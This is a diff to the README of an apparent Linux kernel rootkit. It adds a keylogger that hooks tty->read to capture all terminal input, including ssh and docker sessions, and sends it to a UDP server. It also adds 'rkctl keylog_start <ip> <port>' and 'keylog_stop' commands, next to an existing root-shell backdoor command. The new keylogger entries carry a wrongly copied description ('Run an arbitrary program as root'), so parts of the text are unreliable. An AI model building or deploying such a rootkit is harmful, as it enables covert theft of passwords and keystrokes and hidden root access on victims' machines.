@@ -34,6 +34,12 @@ which is less stealthy and allows rootkit detection via syscall table integrity 
 
 Execute an arbitrary program as root.
 
+* **Keylogger:**
+
+A keylogger that hooks the tty->read function to receive all the input data from TTY/PTY
+pseudoterminals, which is used for the user interface, ssh, docker, ...
+The data will then be sent to an UDP server, control characters will be parsed to a specific string format.
+
 ## Build dependencies
 
 `apt-get install linux-headers-$(uname -r)`
@@ -78,3 +84,15 @@ The rootkit control program supports the following commands:
     Run an arbitrary program as root (e.g. root shell via /bin/sh): 
 
     ``./rkctl backdoor <program>``
+    
+* ***Start Keylogger:***   
+ 
+    Run an arbitrary program as root (e.g. root shell via /bin/sh): 
+
+    ``./rkctl keylog_start <ip> <port>``
+
+* ***Stop Keylogger:***
+
+    Run an arbitrary program as root (e.g. root shell via /bin/sh): 
+
+    ``./rkctl keylog_stop``
